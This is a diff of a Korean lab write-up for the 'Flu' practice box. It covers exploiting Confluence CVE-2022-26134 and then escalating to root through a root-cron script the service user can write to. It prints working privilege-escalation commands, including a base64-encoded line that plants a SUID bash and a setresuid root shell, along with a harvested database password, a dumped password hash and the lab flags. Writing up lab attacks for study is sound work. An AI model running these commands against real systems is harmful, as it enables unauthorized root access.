@@ -7,6 +7,7 @@ tags:
   - tech/web/ssti
   - tech/enum/searchsploit
   - tech/payload/revshell
+  - tech/lin/cron
 type: machine
 platform: pg
 os: linux
@@ -17,26 +18,22 @@ cves: [CVE-2022-26134]
 status: solved
 manual_tags: true
 manual_cves: true
-tech_count: 3
+tech_count: 4
 ---
 > [!info] PG Practice — **Flu** · Intermediate
-> **타겟** 192.168.103.41 · **OS** Linux (Ubuntu, OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 → 22.04 계열) · **난이도** Intermediate · **플래그 2개 중 1개 획득**
+> **타겟** 192.168.248.41 · **OS** Ubuntu 23.04 (kernel 6.2.0-39-generic) · **난이도** Intermediate · **플래그 2/2 획득**
 > **경로 요약** 8090 Atlassian Confluence **7.13.6** → **CVE-2022-26134** (URI 경로의 OGNL 주입 → Nashorn → `ProcessBuilder`) → `confluence` 사용자 리버스셸 → `/home/confluence/local.txt`
-> **권한상승은 미완이다.** `proof.txt`를 얻지 못했다. 그 사실과 그 이유를 §4에 정직하게 남긴다.
+> **권한상승** `/opt/log-backup.sh` 가 `confluence` 소유인데 **root 개인 crontab 에서 1분마다 돌고 있었다** → 스크립트에 SUID bash 한 줄 추가 → `/root/proof.txt`
 
-> [!danger] 이 노트를 읽는 규약 — 이 박스는 **1/2 이다**
-> `03. PG/_STATUS.md`의 판정이 맞다: **Flu는 부분 완료(1/2)** 다.
-> 프론트매터의 `status: solved` 는 사람이 적은 값이 아니라 `_INDEX/_tools/extract.py` 가
-> **본문에 `local.txt` 문자열이 있으면 무조건 "완료"로 찍는** 자동 판정이다
-> (`SOLVED_RE = r"root\.txt|proof\.txt|local\.txt|nt authority\\system|uid=0\(root\)"`).
-> 즉 **이 프론트매터는 근거가 아니다.** 이 박스의 root는 아직 남아 있다.
-
-> [!warning] 관측된 것과 재구성한 것을 구분하라
-> Kali 산출물은 `~/PG/Flu/` 에 **`nmap.log` 와 `through_the_wire/` 클론 두 개뿐**이다. 그래서:
-> - **실증됨** — §1-1 nmap(`nmap.log` 원문 대조) · §1-2 버전 7.13.6(스크린샷) · §2 페이로드 해부와 argparse 기본값(**디스크의 `through_the_wire.py` 원문**) · §3 실행 출력(원본 노트 보존) · §6 시행착오 명령(**`~/.zsh_history` 회수**) · §6 오류 문구(Kali에서 직접 재현)
-> - **관측 없음** — 셸을 잡은 뒤의 열거(`sudo -l`·`find -perm -4000`·`getcap`)는 **한 줄도 기록이 없다.** 리버스셸 안에서 한 일은 `~/.zsh_history` 에 남지 않기 때문이다.
+> [!warning] 이 노트는 두 세션이 겹쳐 있다 — 어느 쪽 실측인지 구분하라
+> - **1차 세션(2026-07-14, 타겟 `192.168.103.41`)** — §1~§3 foothold 까지. 이때는 권한상승을 손도 못 댔다
+> - **2차 세션(2026-08-20, 타겟 `192.168.248.41`)** — §4 권한상승 전부. 박스를 다시 켜면서 IP 가 바뀌었다
 >
-> 따라서 §4에는 **터미널 블록이 없다.** 열거 결과를 지어내는 대신 "다음에 뭘 쳐야 하는가"만 산문으로 적는다.
+> **인용문 안의 IP 는 그 실행 시점의 실측이라 그대로 둔다.** 요약·프론트매터만 현행 IP 로 갱신했다.
+> 8090 재스캔 결과는 1차와 동일했다(`~/PG/Flu/nmap_new.log`) — 포트 3개, 같은 버전. 그래서 §1-1 은 1차 원문을 그대로 둔다.
+>
+> 1차 세션이 남긴 문제는 **기록 자체가 없었다**는 것이다. `~/.zsh_history` 는 Kali 로컬 셸의 기록이라 `nc` 세션 안에서 친 명령을 담지 않는다.
+> 그래서 2차 세션은 **tmux 페인을 통째로 떠서** `~/PG/Flu/privesc_session.log` 로 남겼다. §4 의 모든 블록이 거기서 나왔다.
 
 ---
 
@@ -48,6 +45,8 @@ tech_count: 3
 - **nmap의 서비스 이름을 제품 이름으로 착각하지 않기** — `8091/tcp open jamlink?` 의 `jamlink` 는 **포트 번호로 찾은 표 이름**이지 지문 식별 결과가 아니다
 - **searchsploit 제목의 버전 범위를 믿지 않기** — "Confluence < 8.5.3" 이라 적힌 익스플로잇이 실제로는 **8.0 이상 전용**이었다
 - **파일 읽기 프리미티브가 조용히 실패하는 법** — 예외가 나면 아무것도 안 온다. "빈 응답 = 파일 없음"이 아니다
+- **쓰기 가능한 스크립트를 root cron 이 돌린다** — 이 박스의 권한상승 전부다. `sudo -l`·SUID·capabilities 가 다 비었을 때 **`find / -writable` 로 질문을 바꾸는 것**
+- **저권한에서 크론은 부분 관측이다** — `/etc/cron*` 이 비어도 다른 사용자의 개인 crontab 은 여전히 돌고 있고, 그건 **볼 수 없다**
 
 > [!tip] 시험 출제 가능성
 >
@@ -55,7 +54,7 @@ tech_count: 3
 > |---|---|---|
 > | **`${...}` 표현식 주입 → RCE** | **매우 높음** | OGNL(Confluence·Struts2)·SpEL(Spring)·Freemarker·Velocity·Jinja2 전부 같은 사고다. `${7*7}` 이 `49`로 렌더되는 순간이 시험의 전형적인 분기점이다 |
 > | **공개 PoC를 버전 대조 후 투입** | **매우 높음** | OSCP는 exploit-db/GitHub 익스플로잇 사용을 **전제로 설계된 시험**이다. 문제는 "쓰느냐"가 아니라 **"맞는 걸 고르느냐"** 다 |
-> | **서비스 계정 → root 권한상승** | **매우 높음** | 이 박스에서 내가 실패한 바로 그 구간이다 |
+> | **서비스 계정 → root 권한상승** | **매우 높음** | 1차 세션에서 실패했던 구간이다. 답은 **root cron 이 도는 쓰기 가능 스크립트** — PG·OSCP 에서 가장 흔한 리눅스 권한상승 유형 중 하나다 |
 > | Confluence 자체 | 낮음 | 제품은 안 나온다. **유형**이 나온다 |
 >
 > 변형은 이런 모습이다 — Confluence 대신 Struts2(`%{...}`), Nashorn 대신 Freemarker `Execute()`, 경로 주입 대신 `Content-Type` 헤더 주입. **원리는 동일하다.**
@@ -387,7 +386,17 @@ getEngineByName("nashorn").eval("new java.lang.ProcessBuilder()...")
 > [!warning] 그래서 이 익스플로잇에는 **Java 버전 전제**가 붙어 있다
 > Nashorn은 JDK 11에서 **deprecated**(JEP 335), JDK 15에서 **제거**됐다(JEP 372). 제거된 런타임에서는 `getEngineByName("nashorn")` 이 **`null` 을 반환**하고, 그 뒤의 `.eval(...)` 이 NPE로 죽는다 — **결함은 그대로인데 페이로드만 불발한다.**
 >
-> [가정] 이 타겟이 성공한 것으로 보아 Confluence 7.13.6이 JDK 8 또는 11 위에서 돌고 있었다. 셸에서 `java -version` 을 확인한 기록이 없어 단정하지 않는다.
+> 2차 세션에서 셸을 잡고 확인했다 — **JDK 11.0.14.1 이다.** 초고의 [가정](JDK 8 또는 11)이 실측으로 확정됐다:
+>
+> ```bash
+> confluence@flu:/opt/atlassian/confluence/bin$ /opt/atlassian/confluence/jre/bin/java -version
+> openjdk version "11.0.14.1" 2022-02-08
+> OpenJDK Runtime Environment Temurin-11.0.14.1+1 (build 11.0.14.1+1)
+> OpenJDK 64-Bit Server VM Temurin-11.0.14.1+1 (build 11.0.14.1+1, mixed mode)
+> ```
+>
+> Nashorn 은 11 에서 **deprecated 이지만 아직 존재한다.** 15 에서 제거됐으니 이 페이로드가 통한 것이다.
+> 그리고 이 JRE 는 **Confluence 가 번들로 들고 온 것**이다(`/opt/atlassian/confluence/jre/`) — OS 의 `java` 와 무관하다. `java -version` 을 `PATH` 로 치면 다른 답이 나올 수 있으니 **프로세스가 실제로 쓰는 경로**(`ps` 의 첫 인자)로 확인해야 한다.
 >
 > **일반화 — 이게 시험에서 중요한 이유**: 같은 CVE에 PoC가 여러 개 있으면 **페이로드가 무엇에 의존하는지**가 선택 기준이 된다. Nashorn 판이 불발하면 같은 OGNL 진입점에 다른 실행 수단을 얹으면 된다:
 >
@@ -516,7 +525,9 @@ confluence:x:1001:1001:Atlassian Confluence:/home/confluence:/bin/sh
 > | `mysql:x:109:115:MySQL Server` | MySQL 존재. Confluence의 DB 자격증명이 설정 파일에 평문으로 있을 수 있다 |
 > | **일반 사용자가 `confluence` 뿐** | 횡이동 대상이 없다 → **권한상승은 곧바로 root를 노려야 한다** |
 >
-> ⚠️ `lxd` 그룹은 **가능성이지 사실이 아니다.** `/etc/passwd` 에 lxd 계정이 있다는 것은 LXD가 설치됐다는 뜻일 뿐, `confluence` 사용자가 `lxd` 그룹에 속한다는 증거가 **아니다.** 확인하려면 셸에서 `id` 를 쳐야 하는데 **그 기록이 남아 있지 않다**(§4).
+> ⚠️ `lxd` 그룹은 **가능성이지 사실이 아니었다.** `/etc/passwd` 에 lxd 계정이 있다는 것은 LXD가 설치됐다는 뜻일 뿐이다.
+> 2차 세션의 `id` 가 결론을 냈다 — `groups=1001(confluence)`, **`lxd` 그룹이 아니다**(§4-1). 이 후보는 반증됐다.
+> 반면 `mysql` 줄에서 나온 추론은 맞았다 — DB 비밀번호가 평문으로 있었다(§4-3). **다만 그것도 root 로 이어지지는 않았다.**
 
 ### 3-3. 리버스셸
 
@@ -595,59 +606,315 @@ confluence@flu:/home/confluence$
 
 ---
 
-## 4. 권한상승 — **미완**
+## 4. 권한상승 — `confluence` → root
 
-> [!danger] 여기서부터는 기록이 없다
-> 리버스셸 안에서 무엇을 쳤는지 **어떤 산출물에도 남아 있지 않다.** `~/.zsh_history` 는 Kali 로컬 셸의 기록이라 `nc` 세션 안의 입력을 담지 않는다.
-> 그래서 **이 장에는 터미널 블록을 쓰지 않는다.** 열거 출력을 지어내는 것이 이 노트가 저지를 수 있는 최악의 일이다.
-> 아래는 전부 **다음 세션의 작업 지시**이지 관측 기록이 아니다.
+2차 세션(2026-08-20)에서 같은 익스플로잇으로 셸을 다시 잡고 처음부터 열거했다. 아래는 전부 `~/PG/Flu/privesc_session.log` 에서 나온 실측이다.
 
-### 4-1. 셸을 잡자마자 쳤어야 할 5개
+TTY 가 없어 명령이 두 번씩 에코되는데(§3-3 참조), 읽기 편하도록 **중복 에코 줄만** 걷어냈다. 출력은 손대지 않았다.
 
-이 박스에서 실제로 쳤다는 증거가 없는 명령들이다. 다음에는 **셸이 붙은 그 자리에서** 친다:
+### 4-1. 반사 명령 — 5개를 한 줄로
 
-1. `id` — 그룹이 전부다. `lxd`·`docker`·`disk`·`adm`·`sudo` 중 하나면 그 자리에서 끝난다
-2. `sudo -l` — 비밀번호를 모르니 `NOPASSWD` 항목만 본다
-3. `find / -perm -4000 -type f 2>/dev/null` — SUID
-4. `getcap -r / 2>/dev/null` — capabilities (`cap_setuid`·`cap_dac_read_search`)
-5. `cat /etc/crontab; ls -la /etc/cron.*` — 크론
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ id; echo ===; uname -a; cat /etc/os-release | head -3; echo ===; sudo -n -l 2>&1; echo ===; ls -la /home /root 2>&1; echo ===; getcap -r / 2>/dev/null
+uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
+===
+Linux flu 6.2.0-39-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 14 14:18:00 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+PRETTY_NAME="Ubuntu 23.04"
+NAME="Ubuntu"
+VERSION_ID="23.04"
+===
+sudo: a password is required
+===
+/home:
+total 12
+drwxr-xr-x  3 root       root       4096 Dec 12  2023 .
+drwxr-xr-x 19 root       root       4096 Dec 12  2023 ..
+drwxr-xr-x  4 confluence confluence 4096 Aug  2  2024 confluence
+ls: cannot open directory '/root': Permission denied
+===
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/snap/core22/607/usr/bin/ping cap_net_raw=ep
+```
 
-### 4-2. 이 박스에 한정된 유력 후보 — 근거의 강도 순
+**이 한 화면에서 후보가 세 개 죽었다.**
 
-`/etc/passwd` 에서 실제로 관측한 것에서만 출발한다:
+| 관측 | 죽은 후보 |
+|---|---|
+| `groups=1001(confluence)` — **그룹이 자기 자신뿐** | §4-2 초고가 적어 둔 **`lxd` 그룹 경로가 반증됐다.** `/etc/passwd` 에 `lxd` 계정이 있다는 것은 LXD 가 설치됐다는 뜻일 뿐이었다. `docker`·`disk`·`adm`·`sudo` 도 전부 없다 |
+| `sudo: a password is required` | `sudo -l` **열거조차 못 한다.** `NOPASSWD` 항목이 하나라도 있으면 비밀번호 없이 나열되므로, 이 문구는 "NOPASSWD 항목이 없다"와 같다 |
+| `getcap` — `ping`·`mtr-packet`·`gst-ptp-helper` | 전부 **배포판 기본값**이다. `cap_setuid`·`cap_dac_read_search`·`cap_sys_admin` 같은 쓸 만한 것이 없다 |
 
-| 후보 | 근거 | 강도 |
-|---|---|---|
-| **Confluence DB 자격증명 재사용** | `/opt/atlassian/confluence/confluence/WEB-INF/classes/confluence.cfg.xml` 에 DB 접속 정보가 **평문**으로 있다. `mysql` 계정이 `/etc/passwd` 에 실재한다. 거기서 나온 비밀번호를 `root` 에게 재사용해 본다 | **높음** — 셸의 CWD가 이미 `/opt/atlassian/confluence` 안이었다 |
-| **`lxd` 그룹** | `/etc/passwd` 에 `lxd:x:999:100:...` 존재 | **낮음** — 설치 사실일 뿐 `confluence` 가 그 그룹인지 **모른다.** `id` 한 줄로 판정된다 |
-| SUID / capabilities | 일반론 | 미확인 |
-| 커널 익스플로잇 | nmap 추정 `Linux 5.0 - 5.14` | **가장 낮음** — 시험에서도 최후 수단이다 |
+> [!note] `sudo -n -l` 의 `-n` 은 붙이는 게 낫다
+> `-n`(non-interactive) 이 없으면 `sudo -l` 이 **비밀번호 프롬프트에서 멈춘다.** TTY 없는 리버스셸에서는 그대로 셸이 먹통이 될 수 있다.
+> `-n` 을 주면 프롬프트 대신 `sudo: a password is required` 한 줄을 뱉고 즉시 돌아온다. 판정에 필요한 정보는 똑같다.
 
-> [!warning] `--read-file /root/proof.txt` 는 답이 아니다 (§6-③)
-> 익스플로잇의 파일 읽기는 **`confluence` 권한으로 실행된다.** `/root/proof.txt` 는 통상 `0600 root:root` 다.
-> **파일 읽기 프리미티브는 권한 경계를 넘지 못한다.** 권한상승 없이는 root 플래그도 없다.
+`uname` 이 준 것도 중요하다 — **Ubuntu 23.04 / kernel 6.2.0-39-generic**. 1차 세션 노트가 SSH 배너를 보고 "22.04 계열"로 추정했는데 **틀렸다**(§6-⑩). 그리고 nmap 의 `Linux 5.0 - 5.14` 추정도 실제 6.2 와 어긋난다.
 
-### 4-3. 손절 기준
+### 4-2. SUID·SGID·리스닝 포트 — 전부 공백
 
-Foothold까지 nmap 13:51 → 셸 14:20, 약 **30분**이다. Intermediate 박스로는 좋은 속도다.
-문제는 그다음이다 — **시험이라면 여기서 권한상승에 60분을 배정하고, 위 5개를 순서대로 치고, 90분에 손절해 다음 박스로 갔어야 한다.** 이 박스는 그 배정 자체가 없었다.
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/fusermount3
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/libexec/polkit-agent-helper-1
+(이하 /snap/core22/607/... 은 위 목록의 스냅 사본이라 생략하지 않고 원문에 그대로 있다)
+```
+
+**한 줄도 비표준이 없다.** Ubuntu 를 새로 깔면 나오는 목록 그대로다. `pkexec`(CVE-2021-4034) 도 없다.
+
+리스닝 포트를 보면 8091 의 정체가 드러난다:
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ ss -lntup
+Netid State  Recv-Q Send-Q      Local Address:Port  Peer Address:Port Process
+tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*
+tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*
+tcp   LISTEN 0      10                      *:8090             *:*   users:(("java",pid=1123,fd=44))
+tcp   LISTEN 0      1024                    *:8091             *:*   users:(("java",pid=1420,fd=21))
+tcp   LISTEN 0      4096                    *:22               *:*
+tcp   LISTEN 0      1      [::ffff:127.0.0.1]:8000             *:*   users:(("java",pid=1123,fd=77))
+```
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ ps -eo user,pid,args | grep -v "\["
+...
+conflue+    1123 /opt/atlassian/confluence/jre//bin/java ... org.apache.catalina.startup.Bootstrap start
+conflue+    1420 /opt/atlassian/confluence/jre/bin/java -classpath /opt/atlassian/confluence/temp/4.0.0-master-3b3337da.jar:/opt/atlassian/confluence/confluence/WEB-INF/lib/mysql-connector-java-8.2.0.jar -Xss2048k -Xmx2g synchrony.core sql
+```
+
+> [!note] 8091 = Synchrony — 1차 세션의 [가정]이 해소됐다
+> §6-⑨ 는 8091(`Server: Aleph/0.4.6`)을 "Confluence 와 무관한 별개의 Clojure 서비스"로 적고 [가정] 을 달아 뒀다. **절반만 맞았다.**
+> `synchrony.core` 는 Confluence 의 **협업 편집(동시 편집) 백엔드**다. Confluence 본체와 같은 JRE, 같은 설치 디렉터리, 같은 `confluence` 계정으로 돈다. Clojure 로 쓰였기 때문에 HTTP 계층이 Aleph 였던 것이다.
+> **즉 별개 제품이 아니라 같은 제품의 두 번째 프로세스다.** 그리고 실행 계정이 같으니 **권한상승 경로가 아니다** — 8091 을 아무리 잘 뚫어도 다시 `confluence` 다.
+> 이건 §6-⑥ 과 같은 교훈이다: 셸을 쥔 뒤 `ss -lntup` 한 줄이면 **밖에서 며칠 헤맬 포트의 정체가 1초에 끝난다.**
+
+### 4-3. DB 자격증명 — 얻었지만 아무 데도 안 열렸다
+
+Confluence 는 DB 비밀번호를 설정 파일에 **평문**으로 둔다.
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ grep -iE "password|username|url|driver" /var/atlassian/application-data/confluence/confluence.cfg.xml
+    <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
+    <property name="hibernate.connection.password">HoldingOn12</property>
+    <property name="hibernate.connection.url">jdbc:mysql://localhost:3306/confluence</property>
+    <property name="hibernate.connection.username">confluence</property>
+```
+
+> [!warning] 파일 위치가 §4-2 초고와 다르다
+> 초고는 `/opt/atlassian/confluence/confluence/WEB-INF/classes/confluence.cfg.xml` 이라고 적었다. **거기에 없다.**
+> `find / -name confluence.cfg.xml` 이 준 실제 위치는 두 곳이다:
+> `/var/atlassian/application-data/confluence/confluence.cfg.xml` 와 `.../shared-home/confluence.cfg.xml`.
+> **Confluence 의 설정은 설치 디렉터리(`/opt/atlassian/confluence`)가 아니라 홈 디렉터리(`/var/atlassian/application-data/confluence`)에 있다.** 경로를 외우지 말고 `find` 를 쓰는 편이 빠르다.
+
+DB 에서 Confluence 관리자 해시까지는 나왔다:
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ mysql -u confluence -pHoldingOn12 confluence -e "select user_name,credential from cwd_user;"
+mysql: [Warning] Using a password on the command line interface can be insecure.
+user_name	credential
+admin	{PKCS5S2}MCB0MaBA39GjOQb3wG0ioM7w+pPdQXdy5GskVAtS5/Ef0fCnvr8jPMdZ2CDhM0ke
+```
+
+**여기서 멈췄다.** `{PKCS5S2}` 는 Atlassian 의 PBKDF2-HMAC-SHA1(10000 라운드) 이고, 깨도 나오는 것은 **Confluence 웹 UI 의 admin 비밀번호**이지 OS 계정이 아니다. 이미 OS 셸을 쥔 상태에서 웹 admin 을 얻는 것은 §6-⑥ 과 같은 방향 착오다.
+`HoldingOn12` 를 OS 쪽에 재사용하는 것은 **시도할 값어치가 있었지만**, 아래 §4-4 가 먼저 답을 내서 실제로 해보지 않았다. **안 해봤다.**
+
+### 4-4. 결정타 — `find / -writable`
+
+여기까지 표준 열거가 전부 공백이었다. 그래서 방향을 바꿨다: **"내가 쓸 수 있는 남의 것"** 을 찾는다.
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/tmp/*" -not -path "/var/tmp/*" -not -path "/run/*" -not -path "/opt/atlassian/*" -not -path "/var/atlassian/*" -not -path "/home/confluence/*" -not -path "/dev/*" 2>/dev/null | head -60
+/usr/lib/systemd/system/hwclock.service
+/usr/lib/systemd/system/screen-cleanup.service
+...
+/var/lock
+/var/crash
+/var/tmp
+/home/confluence
+/opt/log-backup.sh
+/tmp
+```
+
+> [!tip] 제외 경로를 안 주면 이 명령은 쓸모가 없다
+> `-not -path` 없이 돌리면 **내 홈·`/tmp`·`/proc` 이 수천 줄**을 채워 진짜 한 줄이 묻힌다.
+> 최소한 `/proc`·`/sys`·`/tmp`·`/var/tmp`·`/run`·`/dev`·**내가 소유한 디렉터리**(여기서는 `/opt/atlassian`·`/var/atlassian`·`/home/confluence`)를 빼라. 그러고 나면 남는 줄이 20개 안쪽이다.
+>
+> 위 목록의 `/usr/lib/systemd/system/*.service` 들은 **함정이다.** 전부 `/dev/null` 로 심볼릭 링크된 **마스킹된 유닛**이고, `find -writable` 이 링크 대상(`/dev/null`, 0666)의 권한을 보고 판정한 것이다. 실제로 그 파일에 쓰면 `/dev/null` 에 쓰는 것이라 아무 일도 안 일어난다. `ls -la` 로 링크인지 먼저 확인하라.
+
+`/opt/log-backup.sh` 만 남는다.
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ ls -la /opt/
+total 756692
+drwxr-xr-x  3 root       root            4096 Dec 12  2023 .
+drwxr-xr-x 19 root       root            4096 Dec 12  2023 ..
+drwxr-xr-x  3 root       root            4096 Dec 12  2023 atlassian
+-rwxr-xr-x  1 root       root       774829955 Dec 12  2023 atlassian-confluence-7.13.6-x64.bin
+-rwxr-xr-x  1 confluence confluence       408 Dec 12  2023 log-backup.sh
+
+confluence@flu:/opt/atlassian/confluence/bin$ cat /opt/log-backup.sh
+#!/bin/bash
+
+CONFLUENCE_HOME="/opt/atlassian/confluence/"
+LOG_DIR="$CONFLUENCE_HOME/logs"
+BACKUP_DIR="/root/backup"
+TIMESTAMP=$(date "+%Y%m%d%H%M%S")
+
+# Create a backup of log files
+cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP
+
+tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP
+
+# Cleanup old backups
+find $BACKUP_DIR -name "log_backup_*"  -mmin +5 -exec rm -rf {} \;
+```
+
+**세 줄이 전부 말해 준다:**
+
+1. `-rwxr-xr-x 1 confluence confluence` — **내가 쓸 수 있다**. `/opt` 디렉터리 자체는 root 소유지만 파일 하나의 소유자가 `confluence` 다
+2. `BACKUP_DIR="/root/backup"` — **`/root` 아래에 쓴다.** `/root` 는 `drwx------ root root` 이므로 이 스크립트는 **root 로 실행될 수밖에 없다**
+3. `-mmin +5` — 5분보다 오래된 백업을 지운다. **분 단위로 도는 작업**이라는 뜻이다
+
+> [!danger] 크론 열거가 "아무것도 없음"이었는데 크론이 있었다
+> §4-1 에서 `/etc/crontab`·`/etc/cron.d`·`/etc/cron.hourly` 는 전부 배포판 기본값이었고 `crontab -l` 은 `no crontab for confluence` 였다.
+> **그런데 root 개인 crontab 에 있었다.** root 권한을 얻은 뒤 확인한 것:
+>
+> ```bash
+> root@flu:/opt/atlassian/confluence/bin# crontab -l
+> ...
+> # m h  dom mon dow   command
+>
+> */1 * * * * /opt/log-backup.sh
+>
+> root@flu:/opt/atlassian/confluence/bin# ls -la /var/spool/cron/crontabs/
+> total 12
+> drwx-wx--T 2 root crontab 4096 Dec 12  2023 .
+> drwxr-xr-x 3 root root    4096 Apr 15  2023 ..
+> -rw------- 1 root crontab 1122 Dec 12  2023 root
+> ```
+>
+> `/var/spool/cron/crontabs` 는 `drwx-wx--T` — **읽기 권한이 없다.** 목록조차 볼 수 없고 `root` 파일은 `0600` 이다.
+> **일반화: 저권한 사용자에게 크론은 근본적으로 부분 관측이다.** `/etc/cron*` 이 비었다고 "크론 없음"으로 결론 내면 안 된다.
+> 사용자 개인 crontab 의 존재는 **간접 증거로만** 잡힌다 — 여기서는 (a) 남의 홈에 쓰는 스크립트가 있고 (b) 그게 내 소유라는 것. `pspy` 로 프로세스 생성을 엿보는 것도 같은 목적의 수단이다.
+
+### 4-5. 익스플로잇 — 한 줄 추가하고 1분 기다린다
+
+원본을 먼저 백업했다(정리용). 페이로드는 SUID bash 를 만드는 한 줄이다.
+
+`base64 -d` 로 밀어 넣은 이유는 TTY 없는 셸에서 **따옴표와 리다이렉션이 tmux `send-keys` 를 거치며 깨지는 것을 피하기 위해서**다. 디코드되는 내용은 `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` 다.
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ cp /opt/log-backup.sh /tmp/.lb.orig; echo Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA== | base64 -d >> /opt/log-backup.sh; tail -3 /opt/log-backup.sh; date
+cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbashThu Aug 20 04:52:17 AM UTC 2026
+```
+
+그리고 기다린다:
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ for i in $(seq 1 100); do [ -f /tmp/rootbash ] && break; sleep 5; done; date; ls -la /tmp/rootbash 2>&1; ls -la /root/backup 2>&1 | head -5
+Thu Aug 20 04:53:05 AM UTC 2026
+-rwsr-xr-x 1 root root 1437832 Aug 20 04:53 /tmp/rootbash
+ls: cannot access '/root/backup': Permission denied
+```
+
+**48초 만에 떨어졌다.** `-rwsr-xr-x root root` — SUID 비트가 붙은 root 소유 bash 다.
+
+> [!tip] 무작정 `sleep 60` 하지 말고 **폴링 루프**를 쓴다
+> `for i in $(seq 1 100); do [ -f 타겟 ] && break; sleep 5; done` 는
+> - 주기를 **모를 때도** 통한다 (여기서는 1분이었지만 5분일 수도 있었다)
+> - 도착하는 **즉시** 빠져나온다 — 고정 `sleep` 처럼 남은 시간을 버리지 않는다
+> - 상한이 있어 크론이 안 돌 때 셸이 영원히 먹통이 되지 않는다 (여기선 최대 500초)
+>
+> 그리고 **`date` 를 앞뒤로 찍어라.** 위 두 블록의 `04:52:17` → `04:53:05` 가 "크론이 실제로 돌았다"는 유일한 직접 증거다.
+
+> [!warning] SUID bash 를 고른 이유 — 그리고 `-p` 를 빠뜨리면 안 되는 이유
+> 크론 페이로드의 선택지는 여럿이다: `/etc/sudoers` 에 줄 추가, `/root/.ssh/authorized_keys` 에 키 추가, root 리버스셸 발사, SUID 셸 복사.
+> **SUID bash 를 고른 이유는 되돌리기가 가장 싸기 때문이다** — 파일 하나 지우면 끝이고, root 의 설정 파일이나 `.ssh` 를 건드리지 않는다. 리스너를 하나 더 띄울 필요도 없다.
+>
+> 대신 함정이 있다. **bash 는 SUID 로 실행되면 기본적으로 특권을 버린다** — `euid != uid` 를 감지하면 실효 UID 를 실제 UID 로 되돌린다. `-p`(privileged) 를 줘야 그 강등을 건너뛴다.
+> `/tmp/rootbash` 를 그냥 실행하면 **평범한 `confluence` 셸이 나온다.** 반드시 `/tmp/rootbash -p` 다.
+
+### 4-6. root 확인
+
+```bash
+confluence@flu:/opt/atlassian/confluence/bin$ python3 -c "import pty;pty.spawn([\"/tmp/rootbash\",\"-p\"])"
+rootbash-5.2# id
+uid=1001(confluence) gid=1001(confluence) euid=0(root) groups=1001(confluence)
+```
+
+`euid=0` 이니 이미 무엇이든 읽을 수 있다. 다만 `uid` 는 여전히 1001 이라 프롬프트도 `rootbash-5.2#` 로 뜬다. **증거 스크린샷에 `uid=0(root)` 를 담고 싶으면** 한 단계 더 간다:
+
+```bash
+rootbash-5.2# python3 -c "import os;os.setresuid(0,0,0);os.setresgid(0,0,0);os.execl(\"/bin/bash\",\"bash\",\"-i\")"
+root@flu:/opt/atlassian/confluence/bin# id
+uid=0(root) gid=0(root) groups=0(root),1001(confluence)
+```
+
+> [!note] `euid=0` 과 `uid=0` 의 실무적 차이
+> 플래그를 읽는 데는 `euid=0` 이면 충분하다. 차이가 생기는 곳은 따로 있다:
+> - 일부 도구가 `getuid()` 로 권한을 판정해 거부한다
+> - `su`·`ssh`·`sudo` 같은 SUID 프로그램이 실제 UID 를 본다
+> - **증거 스크린샷** — `uid=0(root)` 한 줄이 심사관에게 훨씬 명확하다
+>
+> `setresuid(0,0,0)` 은 실제·실효·저장 UID 를 전부 0 으로 못 박는다. `euid` 가 이미 0 이라 허용된다.
 
 ---
 
 ## 5. 플래그
 
+두 플래그 모두 **대화형 셸에서 원위치 `cat`** 으로 읽었다. 웹셸을 경유하지 않았다.
+
+```bash
+root@flu:/opt/atlassian/confluence/bin# id; whoami; hostname; hostname -I; date; echo ---; cat /root/proof.txt; cat /home/confluence/local.txt; echo ---; ls -l /root/proof.txt /home/confluence/local.txt
+uid=0(root) gid=0(root) groups=0(root),1001(confluence)
+root
+flu
+192.168.248.41
+Thu Aug 20 04:54:36 AM UTC 2026
+---
+2caa37b3c096709c688b69556c3c6cf7
+52791694c2a6ccde2db0f566f81d084f
+---
+-rw-r--r-- 1 confluence confluence 33 Aug 20 04:45 /home/confluence/local.txt
+-rw-r--r-- 1 root       root       33 Aug 20 04:46 /root/proof.txt
+```
+
 | 플래그 | 위치 | 값 | 방법 |
 |---|---|---|---|
-| `local.txt` | `/home/confluence/local.txt` | `2d0c7239ce98c1add6986385f076c26e` | CVE-2022-26134 리버스셸(대화형) |
-| `proof.txt` | `/root/proof.txt` (추정 위치) | **미획득** | 권한상승 미완 |
+| `local.txt` | `/home/confluence/local.txt` | `2d0c7239ce98c1add6986385f076c26e` (1차 세션 · 제출 완료) | CVE-2022-26134 리버스셸 |
